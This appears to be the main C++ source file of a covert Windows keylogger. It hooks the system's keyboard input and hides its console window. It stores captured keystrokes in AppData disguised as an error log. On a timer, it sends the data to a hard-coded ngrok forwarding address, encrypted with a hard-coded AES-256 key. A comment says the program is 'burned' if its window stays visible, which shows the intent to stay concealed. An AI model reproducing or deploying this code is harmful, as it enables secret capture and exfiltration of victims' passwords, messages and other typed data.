// This is me ignoring the fact that in the auxiliary header file, I used the unsafe localtime function instead of the safe localtime_s function
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include "IO.h"
#include "Keyboard.h"
#include "Transformer.h"
#include "Timer.h"
#include "Exfiltrate.h"
#include "APIHook.h"
#include "Auxiliary.h"

void setOptions(std::string httpServerAddressOption,
    std::string keyStrOption);

int main()
{
    // Please enter your values below, both are mandatory

    std::string ngrokForwardingAddress = "affd-2607-fb90-b2f-577-6991-ef9f-d783-631e.ngrok.io";
    std::string aes256BitKeyString = "25442A472D4B6150645367566B59703373357638792F423F4528482B4D625165";

    setOptions(ngrokForwardingAddress, aes256BitKeyString);

    // Hook into the Windows system that handles key presses

    APIHook::installHook();
   
    // Hide console window

    Auxiliary::hideConsole();

    // If console window is hidden, then continue, otherwise we're burned
    
    if (!Auxiliary::isConsoleVisible())
    {
        // Create the directory where the error log will be stored

        IO::createDirectory(IO::getAppDataPath());

        MSG Msg;

        // Dummy loop to keep execution going

        while (GetMessage(&Msg, NULL, 0, 0))
        {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }

        APIHook::logExfilTimer.stopTimer();

    }

    return 0;
}

void setOptions(std::string httpServerAddressOption, std::string keyStrOption)
{
    Exfiltrate::httpServerAddress = httpServerAddressOption;
    Transformer::keyStr = keyStrOption;
}